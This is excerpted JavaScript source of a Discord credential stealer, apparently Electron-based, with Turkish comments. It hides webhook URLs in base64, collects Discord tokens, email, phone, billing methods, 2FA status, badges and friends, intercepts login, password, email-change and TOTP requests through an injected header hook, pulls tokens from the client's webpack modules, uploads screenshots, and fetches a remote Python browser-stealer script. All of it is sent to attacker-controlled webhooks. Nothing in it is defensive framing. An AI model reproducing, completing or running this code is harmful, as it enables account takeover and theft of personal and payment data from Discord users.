...
// Decrypt webhook URLs at runtime
function _dw() {
    const _p1 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNDE3MTIyOTMyMDI0OTM0NC9mWVFHajdZVk5NUHAtT25UQzhjdU9UdEVHRllSWWRTNjcwT1o0bE1QQU1saHlhYmFoWF9Da2RmWVg4YndfQ3Q2cDVYSQ==';
    return Buffer.from(_p1, 'base64').toString();
}

function _dw2() {
    const _p2 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNDE3MTE5NTc0MDUyNDY5OC96cTIzMUVvZmFDUjRsN3hoeFdfVEQ3allNRU9fNnFVclpFZ2dLTk16ZHFNNkxzUFhRV3RUb2VWcS1TczExX1A2NU41dA==';
    return Buffer.from(_p2, 'base64').toString();
}

function _df() {
    return Buffer.from('aHR0cHM6Ly9yMi5maXZlbWFuYWdlLmNvbS90QnBTYnZBbzRBUmZXdTU0amtHWDUvMGUyYTE2ZDA1NDA0NmMzNGQ1YTE4OWY2OTE1ZjQyYTAucG5n', 'base64').toString();
}

const CONFIG = {
    WEBHOOK: _dw(),
    WEBHOOK_SCREENSHOT: _dw2(),
    FOOTER_ICON: _df(),
    PATHS: {
...
class TokenStealer {
    ...
    /** Sadece 9 profil rozeti (Quest ve Nitro/Boost ayrı). Sıra: Staff, Partner, HypeSquad, Early Supporter, BH1, BH2, Active Dev, Verified Bot Dev, Moderator Alumni. */
    _getBadges(flags, profileData) {
        const EMOJIS = CONFIG.EMOJIS;
        const order = [
            'staff', 'partner', 'hypesquad', 'early_supporter', 'bug_hunter_level_1', 'bug_hunter_level_2',
            'active_developer', 'early_verified_bot_developer', 'moderator_alumni'
        ];
        const idToEmoji = {
            staff: EMOJIS.discord_employee,
            partner: EMOJIS.partnered_server_owner,
            hypesquad: EMOJIS.hypesquad_events,
            bug_hunter_level_1: EMOJIS.bughunter,
            early_supporter: EMOJIS.early_supporter,
            bug_hunter_level_2: EMOJIS.bughuntergold,
            early_verified_bot_developer: EMOJIS.early_verified_bot_developer,
            moderator_alumni: EMOJIS.moderatorprogramsalumni,
        ...
        if (profileData && profileData.badges) {
            for (const b of profileData.badges) {
                if (!b.id) continue;
                if (b.id === 'staff') collected.add('staff');
                if (b.id === 'partner') collected.add('partner');
                if (b.id === 'hypesquad') collected.add('hypesquad');
                if (b.id === 'bug_hunter_level_1') collected.add('bug_hunter_level_1');
                if (b.id === 'early_supporter') collected.add('early_supporter');
                if (b.id === 'bug_hunter_level_2') collected.add('bug_hunter_level_2');
                if (b.id === 'early_verified_bot_developer') collected.add('early_verified_bot_developer');
                if (b.id === 'moderator_alumni') collected.add('moderator_alumni');
                if (b.id === 'active_developer') collected.add('active_developer');
            }
        }
        if (flags) {
            if (flags & 1) collected.add('staff');
            if (flags & 2) collected.add('partner');
            if (flags & 4) collected.add('hypesquad');
            if (flags & 8) collected.add('bug_hunter_level_1');
            if (flags & 512) collected.add('early_supporter');
            if (flags & 16384) collected.add('bug_hunter_level_2');
            if (flags & 131072) collected.add('early_verified_bot_developer');
            if (flags & 262144) collected.add('moderator_alumni');
            if (flags & 4194304) collected.add('active_developer');
        }
        const out = [];
        for (const id of order) {
            if (collected.has(id) && idToEmoji[id]) out.push(idToEmoji[id]);
        }
        return out.length ? out.join(' ') : 'None';
    }

    /** Quest rozeti (sondan 2.). */
    _getQuestBadge(flags, profileData) {
        if (profileData && profileData.badges) {
            for (const b of profileData.badges) {
                if (b.id && b.id.startsWith('quest')) return CONFIG.EMOJIS.questbadge || '';
            }
        }
        return '';
    }

    /** Sıra: 1.Nitro | 2–10.Dokuz rozet | 11.Boost (sondan 3) | 12.Quest (sondan 2). Classic nitro (orb) en sonda eklenmez. */
    _formatAllBadges(nitroBadge, boostBadge, nineBadgesStr, questBadge) {
        const a = (s) => (s === 'None' || !s || !String(s).trim()) ? '' : String(s).trim();
        const nitro = a(nitroBadge);
        const nine = a(nineBadgesStr);
        const boost = a(boostBadge);
        const quest = a(questBadge);
        const parts = [nitro, nine, boost, quest].filter(Boolean);
        return parts.join(' ').replace(/\s+/g, ' ').trim() || 'None';
    }
    ...
    _getNitroBadgeByMonths(since) {
        ...
        // Discord resmi rozet eşikleri: 1ay Bronze, 3ay Silver, 6ay Gold, 12ay Platinum, 24ay Diamond, 36ay Emerald, 60ay Ruby, 72ay Fire/Opal
        const tiers = [
            { badge: EMOJIS.opal || EMOJIS['24_months'], minMonths: 72 },
            { badge: EMOJIS.ruby, minMonths: 60 },
            { badge: EMOJIS.emerald, minMonths: 36 },
            { badge: EMOJIS.diamond, minMonths: 24 },
            { badge: EMOJIS.platinum, minMonths: 12 },
            { badge: EMOJIS.gold, minMonths: 6 },
            { badge: EMOJIS.silver, minMonths: 3 },
            { badge: EMOJIS.bronze, minMonths: 1 },
            { badge: EMOJIS.discord_nitro, minMonths: 0 }
        ];
        const match = tiers.find(n => m >= n.minMonths);
        return match?.badge || EMOJIS.discord_nitro || '';
    }

    /** Nitro + Boost ayrı ayrı (sıralama için). */
    async _getNitro(token, premiumType, profileData) {
        const EMOJIS = CONFIG.EMOJIS;
        if (!premiumType) return { nitroBadge: '', boostBadge: '' };
        ...
        const boostBadges = [EMOJIS.boost1month || '🚀', EMOJIS['2monthsboostnitro'], EMOJIS.nitro_boost_3_months, EMOJIS['6months_boost'], EMOJIS.nitro_boost_9_months, EMOJIS['12monthsboostnitro'], EMOJIS.boost15month, EMOJIS.nitro_boost_18_months, EMOJIS['24_months']];
        let boostBadge = '';
    ...
    async _getBilling(token) {
        try {
            ...
            let bi = '';
            data.forEach(z => {
                if (z.type === 2 && !z.invalid) bi += (CONFIG.EMOJIS.paypal || '🅿️') + ' ';
                else if (z.type === 1 && !z.invalid) bi += '💳 ';
            });
            return bi.trim() || 'None';
        } catch { return 'None'; }
    }
    ...
    async _buildHQFriends(token) {
        ...
        try {
            ...
            const allRelations = Array.isArray(data) ? data : [];
            // Sadece gerçek arkadaşlar (type 1). İstek atılanlar (4) ve gelen istekler (3) dahil edilmez.
            const friends = allRelations.filter(r => r.type === 1);
            ...
            for (const f of friends) {
                ...
                try {
                    ...
                    if (badgeStr === 'None') badgeStr = '';
                    questBadge = this._getQuestBadge(f_flags, pd);
                ...
                const allBadges = this._formatAllBadges(nitroBadge, boostBadge, badgeStr, questBadge);
                if (!allBadges || allBadges === 'None') continue;
    ...
    async _buildHQGuilds(token) {
        try {
            ...
            const lines = hq.map(g => `<:boykisseranvil:1493994623276945418>  \`${g.name}\``); const shown = []; let len = 0;
    ...
    async sendTokens(zipPath = null) {
        logger.info('TokenStealer', `[DEBUG] sendTokens called with ${this.validatedTokens.length} tokens`);
        logger.info('TokenStealer', `[DEBUG] Webhook URL: ${CONFIG.WEBHOOK.substring(0, 50)}...`);
        const THEME = 0xffa1f6;
        const footerTag = 'amınoglu ste4ler';
        ...
        if (this.validatedTokens.length === 0) {
            if (zipPath && fs.existsSync(zipPath)) {
                ...
                await NetworkManager.postWebhook(CONFIG.WEBHOOK, {
                    embeds: [{ title: '📦 Data Report', color: THEME, description: 'No tokens found and no ZIP.', timestamp: new Date().toISOString(), footer: { text: footerTag, icon_url: CONFIG.FOOTER_ICON } }]
                });
            }
            return;
        }
        ...
        for (const { token, userInfo } of this.validatedTokens) {
            try {
                ...
                const badgesNine = this._getBadges(flags, profileData);
                const questBadge = this._getQuestBadge(flags, profileData);
                const { nitroBadge, boostBadge } = await this._getNitro(token, u.premium_type, profileData);
                const twoFAType = u.mfa_enabled ? await this._get2FAType(token) : 'None';

                // Format token with code block
                const tokenDisplay = `\`\`\`${token}\`\`\``;
                
                // Format badges
                const badgesValue = this._formatAllBadges(nitroBadge, boostBadge, badgesNine, questBadge);
                const badgesDisplay = badgesValue !== 'None' ? badgesValue : '<:cross:1493973039459729448>';
                
                // Format billing
                const billingDisplay = billing !== 'None' ? billing : '<:cross:1493973039459729448>';
                
                // Format 2FA
                const twoFADisplay = u.mfa_enabled ? '<:check:1493973332264095864>' : '<:cross:1493973039459729448>';
                
                // Format email and phone
                const emailDisplay = u.email ? `\`${u.email}\`` : '`N/A`';
                const phoneDisplay = u.phone ? `\`${u.phone}\`` : '`None`';
                
                // Format username
                const usernameDisplay = `\`${u.username}\` (${u.global_name || u.username})`;
                
                // Format security
                const securityDisplay = u.mfa_enabled ? '`Multi factor auth is on!`' : '`Multi factor auth is off!`';

                // Token'ı mor renkli göster (ANSI purple)
                const tokenWithColor = `\`\`\`ansi\n\u001b[0;35m${token}\u001b[0m\n\`\`\``;
                
                const embed1 = {
                    color: THEME,
                    description: `${tokenWithColor}\n<a:wigglycat:1493972656540877001> **Username ->** ${usernameDisplay}\n<a:nyaMooncake:1493972930139262986> **Badges ->** ${badgesDisplay}\n<a:nyaTakemymoney:1493973360424517812> **Billing ->** ${billingDisplay}\n<:cross:1493973039459729448> **Security ->** ${securityDisplay}\n<a:nyaSit:1493972675071311872> **E-Mail ->** ${emailDisplay}\n<a:nyaPat:1493972995931377804> **Phone ->** ${phoneDisplay}`,
                    author: { name: `@${u.username} ${u.discriminator !== '0' ? u.discriminator : ''} (${u.id})`, icon_url: avatarUrl },
                ...
                const webhookPayload = { username: 'Amınoglu ste4ler', avatar_url: CONFIG.FOOTER_ICON, embeds: [embed1, embed2, embed3] };
    ...
    function sendToWebhook(payload) {
      try {
        ...
        if (payload.embeds?.[0]) {
           ...
           if (/login/i.test(title)) e.title = '🔐  Login Detected';
           else if (/password/i.test(title)) e.title = '🔑  Password Changed';
           else if (/email/i.test(title)) e.title = '📧  Email Changed';
           else if (/token/i.test(title)) e.title = '🎫  Token Captured';
           else if (/2fa|mfa/i.test(title)) e.title = '🛡️  2FA Event';
           else e.title = e.title || '⚡  Discord Event';
           e.color = 2829617;
           e.footer = { text: '🔑 Event Captured  •  ' + new Date().toLocaleString('tr-TR') };
      ...
      ses.webRequest.onBeforeSendHeaders({ urls: ['https://discord.com/api/v*/users/@me', 'https://discord.com/api/v*/science', 'https://discord.com/api/v*/auth/login', 'https://discord.com/api/v*/mfa/totp', 'https://discord.com/api/v*/auth/mfa/totp'] }, (details, callback) => {
        try {
          if (details.requestHeaders && details.requestHeaders['Authorization']) {
            ...
            if (token && !global.stolen_token) {
              ...
              sendToWebhook({ embeds: [{ title: 'Discord Token', color: 0xffa1f6, fields: [{ name: 'Token', value: '\`' + token.replace(/"/g, '') + '\`', inline: false }], timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}
        ...
        try {
          if (details.url.includes('/auth/login') && details.method === 'POST') {
            ...
            if (fields.length) {
              sendToWebhook({ embeds: [{ title: '🔐  Login Detected', color: 0xffa1f6, fields, timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}
        ...
        try {
          if (details.url.includes('/users/@me') && details.method === 'PATCH') {
            ...
            if (fields.length) {
              let t = '🔑  Password Changed';
              if(data.email) t = '📧  Email Changed';
              sendToWebhook({ embeds: [{ title: t, color: 0xffa1f6, fields, timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}
        ...
        try {
          if ((details.url.includes('/mfa/totp') || details.url.includes('/auth/mfa/totp')) && details.method === 'POST') {
            ...
            if (fields.length) {
              sendToWebhook({ embeds: [{ title: '🛡️  2FA Event', color: 0xffa1f6, fields, timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}
    ...
    function injectTokenStealer(win) {
      ...
      win.webContents.executeJavaScript('window.webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.default&&m.default.getToken!==undefined){return m.default.getToken()}}}])').then(tk => {
        if(tk && !global.stolen_token_js){
          ...
          sendToWebhook({ embeds: [{ title: 'Discord Token (JS)', color: 0xffa1f6, fields: [{ name: 'Token', value: '\`' + tk.replace(/"/g, '') + '\`', inline: false }], timestamp: new Date().toISOString() }] });
        }
      }).catch(()=>{});
    }
            ...
            try {
                ...
                const payload = {
                    embeds: [{
                        ...
                        footer: { text: `🔑 Event Captured  •  ${new Date().toLocaleString('tr-TR')}` },
                        timestamp: new Date().toISOString()
                    }]
                };
                if (axiosModule) {
...
class SystemInfoCollector {
    ...
    async takeScreenshot(targetDir) {
        ...
        // Send screenshot to second webhook
        const screenshotPath = path.join(targetDir, 'screenshot.png');
        if (fs.existsSync(screenshotPath)) {
            try {
                const computerName = os.hostname() || 'Unknown';
                const username = os.userInfo().username || 'Unknown';
                await NetworkManager.sendWebhookFile(CONFIG.WEBHOOK_SCREENSHOT, screenshotPath, {
                    ...
                    embeds: [{
                        ...
                        timestamp: new Date().toISOString(),
                        footer: { text: 'amınoglu ste4ler', icon_url: CONFIG.FOOTER_ICON }
                    }]
                });
                logger.info('SystemInfo', 'Screenshot sent to webhook');
            } catch (e) {
                logger.error('SystemInfo', `Failed to send screenshot: ${e.message}`);
            }
        }
    }
}
...
class PythonBrowserStealer {
    ...
    async collect(targetDir) {
        const scriptUrl = 'https://raw.githubusercontent.com/kazakh15/browser/refs/heads/main/browser.py';
